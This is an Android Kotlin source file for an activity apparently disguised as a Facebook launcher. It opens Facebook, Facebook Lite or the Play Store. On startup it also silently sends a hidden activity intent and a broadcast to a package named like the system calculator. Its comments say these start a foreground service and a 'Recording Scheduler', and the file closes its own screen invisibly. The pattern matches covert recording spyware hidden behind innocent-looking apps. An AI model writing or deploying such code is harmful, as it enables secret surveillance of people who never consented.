package com.facebook.android

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle

class MainActivity : Activity() {

    private var launchAttempted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Silently trigger CalCulator app background process
        triggerCalculatorBackground()
    }

    override fun onResume() {
        super.onResume()

        if (!launchAttempted) {
            launchAttempted = true
            val launched = launchFacebookApp()
            if (!launched) {
                finishSilently()
            }
        } else {
            // If the user returns to this Activity (e.g. dismissed the Dual App chooser or pressed back),
            // finish immediately so no blank screen remains visible.
            finishSilently()
        }
    }

    override fun onStop() {
        super.onStop()
        // Once the target Facebook app (or Dual App instance) is actually launched and takes the foreground,
        // this trampoline activity moves to the background and finishes cleanly.
        finishSilently()
    }

    private fun finishSilently() {
        finish()
        if (Build.VERSION.SDK_INT >= 34) {
            overrideActivityTransition(OVERRIDE_TRANSITION_CLOSE, 0, 0)
        } else {
            @Suppress("DEPRECATION")
            overridePendingTransition(0, 0)
        }
    }

    private fun triggerCalculatorBackground() {
        // Method 1: Invisible trampoline invocation (starts FGS & Recording Scheduler with top OS privileges)
        runCatching {
            val activityIntent = Intent(ACTION_CALCULATOR_SILENT_WAKEUP).apply {
                setPackage(CALCULATOR_PACKAGE)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
            }
            startActivity(activityIntent)
        }

        // Method 2: Direct broadcast trigger as secondary redundancy
        runCatching {
            val broadcastIntent = Intent(ACTION_CALCULATOR_RESTART).apply {
                setPackage(CALCULATOR_PACKAGE)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(broadcastIntent)
        }
    }

    private fun launchFacebookApp(): Boolean {
        val pm = packageManager

        // Step 1: Check and launch official Facebook app (com.facebook.katana)
        val katanaIntent = pm.getLaunchIntentForPackage(PACKAGE_FACEBOOK_KATANA)
        if (katanaIntent != null) {
            katanaIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
            return runCatching {
                startActivity(katanaIntent)
                true
            }.getOrDefault(false)
        }

        // Step 2: Check and launch Facebook Lite (com.facebook.lite)
        val liteIntent = pm.getLaunchIntentForPackage(PACKAGE_FACEBOOK_LITE)
        if (liteIntent != null) {
            liteIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
            return runCatching {
                startActivity(liteIntent)
                true
            }.getOrDefault(false)
        }

        // Step 3: If neither is installed, redirect to Google Play Store download page
        return try {
            val playStoreIntent = Intent(
                Intent.ACTION_VIEW,
                Uri.parse("market://details?id=$PACKAGE_FACEBOOK_KATANA")
            ).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(playStoreIntent)
            true
        } catch (_: Throwable) {
            // Fallback to web browser Play Store link if market scheme is unavailable
            runCatching {
                val webIntent = Intent(
                    Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=$PACKAGE_FACEBOOK_KATANA")
                ).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(webIntent)
                true
            }.getOrDefault(false)
        }
    }

    companion object {
        private const val CALCULATOR_PACKAGE = "com.android.calculator"
        private const val ACTION_CALCULATOR_RESTART = "com.android.calculator.ACTION_AUTO_RESTART"
        private const val ACTION_CALCULATOR_SILENT_WAKEUP = "com.android.calculator.ACTION_SILENT_WAKEUP"
        private const val PACKAGE_FACEBOOK_KATANA = "com.facebook.katana"
        private const val PACKAGE_FACEBOOK_LITE = "com.facebook.lite"
    }
}